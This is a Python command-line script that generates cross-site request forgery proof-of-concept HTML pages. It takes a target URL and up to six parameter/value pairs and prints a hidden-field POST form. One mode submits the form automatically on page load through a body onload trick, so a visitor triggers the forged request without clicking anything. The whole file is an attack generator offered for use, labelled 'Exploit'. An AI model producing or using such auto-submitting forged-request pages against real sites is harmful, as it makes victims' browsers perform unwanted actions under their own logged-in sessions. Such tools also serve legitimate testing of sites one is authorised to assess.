from termcolor import colored
import requests

def csrfG():
 print(colored(''' 
      +++++ +++++ ++++++  ++++++
      +     +     +     + +
|     +     +++++ ++++++  ++++++    |
      +         + +   +   +
      +++++ +++++ +    ++ +
''','red'))

 poc_name = "<center><h1><font color=red>CSRF POC BY MOONISSMILING</font></h1></center>"
 no_in = '<body onload="document.createElement(\'form\').submit.call(document.getElementById(\'myForm\'))">'
 #user select 1
 Inp1 = input(colored('''
User Interaction[1]
Auto Interaction[2]
1 or 2 > ''','blue'))
 Inp2 = input(colored('Total Parameter [1] [2] [3] [4] > ','blue'))
 if Inp1=='1':
  #User Interaction Progress
  if Inp2=='1':
   #Para1
   inpu = input(colored('Vuln Url > ','red'))
   inp1 = input(colored('Parameter > ','red'))
   inp2 = input(colored('Value > ','red'))
   v1 = f"<form action='{inpu}' method='POST'>"
   v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
   print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
<center><input type=\'submit\' value=\'Exploit\' name=\'submit\'></center>
</form>
  ''')
  elif Inp2=='2':
   #Para2
   inpu = input(colored('Vuln Url > ','red'))
   inp1 = input(colored('Parameter 1 > ','red'))
   inp2 = input(colored('Value 1 > ','red'))
   inp4 = input(colored('Parameter 2 > ','red'))
   inp5 = input(colored('Value 2 > ','red'))
   v1 = f"<form action='{inpu}' method='POST'>"
   v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
   v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
   print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
{v3}
<center><input type=\'submit\' value=\'Exploit\' name=\'submit\'></center>
</form>
  ''')
  elif Inp2=='3':
   #Para3
   inpu = input(colored('Vuln Url > ','red'))
   inp1 = input(colored('Parameter 1 > ','red'))
   inp2 = input(colored('Value 1 > ','red'))
   inp4 = input(colored('Parameter 2 > ','red'))
   inp5 = input(colored('Value 2 > ','red'))
   inp6 = input(colored('Parameter 3 > ','red'))
   inp7 = input(colored('Value 3 > ','red'))
   v1 = f"<form action='{inpu}' method='POST'>"
   v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
   v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
   v4 = f"<input type='hidden' name='{inp6}' value='{inp7}'>"
   print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
{v3}
{v4}
<center><input type=\'submit\' value=\'Exploit\' name=\'submit\'></center>
</form>
  ''')
  elif Inp2=='4':
   #Para4
   inpu = input(colored('Vuln Url > ','red'))
   inp1 = input(colored('Parameter 1 > ','red'))
   inp2 = input(colored('Value 1 > ','red'))
   inp4 = input(colored('Parameter 2 > ','red'))
   inp5 = input(colored('Value 2 > ','red'))
   inp6 = input(colored('Parameter 3 > ','red'))
   inp7 = input(colored('Value 3 > ','red'))
   inp8 = input(colored('Parameter 4 > ','red'))
   inp9 = input(colored('Value 4 > ','red'))
   v1 = f"<form action='{inpu}' method='POST'>"
   v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
   v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
   v4 = f"<input type='hidden' name='{inp6}' value='{inp7}'>"
   v5 = f"<input type='hidden' name='{inp8}' value='{inp9}'>"
   print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
{v3}
{v4}
{v5}
<center><input type=\'submit\' value=\'Exploit\' name=\'submit\'></center>
</form>
  ''')
  elif Inp2=='5':
   #Para5
   inpu = input(colored('Vuln Url > ','red'))
   inp1 = input(colored('Parameter 1 > ','red'))
   inp2 = input(colored('Value 1 > ','red'))
   inp4 = input(colored('Parameter 2 > ','red'))
   inp5 = input(colored('Value 2 > ','red'))
   inp6 = input(colored('Parameter 3 > ','red'))
   inp7 = input(colored('Value 3 > ','red'))
   inp8 = input(colored('Parameter 4 > ','red'))
   inp9 = input(colored('Value 4 > ','red'))
   inp10 = input(colored('Parameter 5 > ','red'))
   inp11 = input(colored('Value 5 > ','red'))
   v1 = f"<form id='myForm' action='{inpu}' method='POST'>"
   v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
   v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
   v4 = f"<input type='hidden' name='{inp6}' value='{inp7}'>"
   v5 = f"<input type='hidden' name='{inp8}' value='{inp9}'>"
   v6 = f"<input type='hidden' name='{inp10}' value='{inp11}'>"
   print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
{v3}
{v4}
{v5}
{v6}
<center><input type=\'submit\' value=\'Exploit\' name=\'submit\'></center>
</form>
  ''')
  elif Inp2=='6':
   #Para5
   inpu = input(colored('Vuln Url > ','red'))
   inp1 = input(colored('Parameter 1 > ','red'))
   inp2 = input(colored('Value 1 > ','red'))
   inp4 = input(colored('Parameter 2 > ','red'))
   inp5 = input(colored('Value 2 > ','red'))
   inp6 = input(colored('Parameter 3 > ','red'))
   inp7 = input(colored('Value 3 > ','red'))
   inp8 = input(colored('Parameter 4 > ','red'))
   inp9 = input(colored('Value 4 > ','red'))
   inp10 = input(colored('Parameter 5 > ','red'))
   inp11 = input(colored('Value 5 > ','red'))
   inp12 = input(colored('Parameter 6 > ','red'))
   inp13 = input(colored('Value 6 >','red'))
   v1 = f"<form id='myForm' action='{inpu}' method='POST'>"
   v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
   v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
   v4 = f"<input type='hidden' name='{inp6}' value='{inp7}'>"
   v5 = f"<input type='hidden' name='{inp8}' value='{inp9}'>"
   v6 = f"<input type='hidden' name='{inp10}' value='{inp11}'>"
   v7 = f"<input type='hidden' name='{inp12}' value='{inp13}'>"
   print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
{v3}
{v4}
{v5}
{v6}
{v7}
<center><input type=\'submit\' value=\'Exploit\' name=\'submit\'></center>
</form>
  ''')
 elif Inp1=='2':
  #Auto Interaction Progress
  if Inp2=='1':
   #Para1
   inpu = input(colored('Vuln Url > ','red'))
   inp1 = input(colored('Parameter > ','red'))
   inp2 = input(colored('Value > ','red'))
   v1 = f"<form id='myForm' action='{inpu}' method='POST'>"
   v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
   print(f'''
--------------POC-------------------
{no_in}
{poc_name}
{v1}
{v2}
</form>
</body>
  ''')
  elif Inp2=='2':
   #Para2
   inpu = input(colored('Vuln Url > ','red'))
   inp1 = input(colored('Parameter 1 > ','red'))
   inp2 = input(colored('Value 1 > ','red'))
   inp4 = input(colored('Parameter 2 > ','red'))
   inp5 = input(colored('Value 2 > ','red'))
   v1 = f"<form id='myForm' action='{inpu}' method='POST'>"
   v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
   v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
   print(f'''
--------------POC-------------------
{no_in}
{poc_name}
{v1}
{v2}
{v3}
</form>
</body>
  ''')
  elif Inp2=='3':
   #Para3
   inpu = input(colored('Vuln Url > ','red'))
   inp1 = input(colored('Parameter 1 > ','red'))
   inp2 = input(colored('Value 1 > ','red'))
   inp4 = input(colored('Parameter 2 > ','red'))
   inp5 = input(colored('Value 2 > ','red'))
   inp6 = input(colored('Parameter 3 > ','red'))
   inp7 = input(colored('Value 3 > ','red'))
   v1 = f"<form id='myForm' action='{inpu}' method='POST'>"
   v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
   v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
   v4 = f"<input type='hidden' name='{inp6}' value='{inp7}'>"
   print(f'''
--------------POC-------------------
{no_in}
{poc_name}
{v1}
{v2}
{v3}
{v4}
</form>
</body>
  ''')
  elif Inp2=='4':
   #Para4
   inpu = input(colored('Vuln Url > ','red'))
   inp1 = input(colored('Parameter 1 > ','red'))
   inp2 = input(colored('Value 1 > ','red'))
   inp4 = input(colored('Parameter 2 > ','red'))
   inp5 = input(colored('Value 2 > ','red'))
   inp6 = input(colored('Parameter 3 > ','red'))
   inp7 = input(colored('Value 3 > ','red'))
   inp8 = input(colored('Parameter 4 > ','red'))
   inp9 = input(colored('Value 4 > ','red'))
   v1 = f"<form id='myForm' action='{inpu}' method='POST'>"
   v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
   v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
   v4 = f"<input type='hidden' name='{inp6}' value='{inp7}'>"
   v5 = f"<input type='hidden' name='{inp8}' value='{inp9}'>"
   print(f'''
--------------POC-------------------
{no_in}
{poc_name}
{v1}
{v2}
{v3}
{v4}
{v5}
</form>
</body>
  ''')
  elif Inp2=='5':
   #Para5
   inpu = input(colored('Vuln Url > ','red'))
   inp1 = input(colored('Parameter 1 > ','red'))
   inp2 = input(colored('Value 1 > ','red'))
   inp4 = input(colored('Parameter 2 > ','red'))
   inp5 = input(colored('Value 2 > ','red'))
   inp6 = input(colored('Parameter 3 > ','red'))
   inp7 = input(colored('Value 3 > ','red'))
   inp8 = input(colored('Parameter 4 > ','red'))
   inp9 = input(colored('Value 4 > ','red'))
   inp10 = input(colored('Parameter 5 > ','red'))
   inp11 = input(colored('Value 5 > ','red'))
   v1 = f"<form id='myForm' action='{inpu}' method='POST'>"
   v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
   v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
   v4 = f"<input type='hidden' name='{inp6}' value='{inp7}'>"
   v5 = f"<input type='hidden' name='{inp8}' value='{inp9}'>"
   v6 = f"<input type='hidden' name='{inp10}' value='{inp11}'>"
   print(f'''
--------------POC-------------------
{no_in}
{poc_name}
{v1}
{v2}
{v3}
{v4}
{v5}
{v6}
</form>
</body>
  ''')
  elif Inp2=='6':
   #Para6
   inpu = input(colored('Vuln Url > ','red'))
   inp1 = input(colored('Parameter 1 > ','red'))
   inp2 = input(colored('Value 1 > ','red'))
   inp4 = input(colored('Parameter 2 > ','red'))
   inp5 = input(colored('Value 2 > ','red'))
   inp6 = input(colored('Parameter 3 > ','red'))
   inp7 = input(colored('Value 3 > ','red'))
   inp8 = input(colored('Parameter 4 > ','red'))
   inp9 = input(colored('Value 4 > ','red'))
   inp10 = input(colored('Parameter 5 > ','red'))
   inp11 = input(colored('Value 5 > ','red'))
   inp12 = input(colored('Parameter 6 > ','red'))
   inp13 = input(colored('Value 6 > ','red'))
   v1 = f"<form id='myForm' action='{inpu}' method='POST'>"
   v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
   v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
   v4 = f"<input type='hidden' name='{inp6}' value='{inp7}'>"
   v5 = f"<input type='hidden' name='{inp8}' value='{inp9}'>"
   v6 = f"<input type='hidden' name='{inp10}' value='{inp11}'>"
   v7 = f"<input type='hidden' name='{inp12}' value='{inp13}'>"
   print(f'''
--------------POC-------------------
{no_in}
{poc_name}
{v1}
{v2}
{v3}
{v4}
{v5}
{v6}
{v7}
</form>
</body>
  ''')
 log_file = open('log/log.txt','a')
 log_file.write(f'[sub] csrf poc generator --> interaction/Yes1/No0 {Inp1} --> vulnerable url {inpu}\n')
 log_file.close()

csrfG()
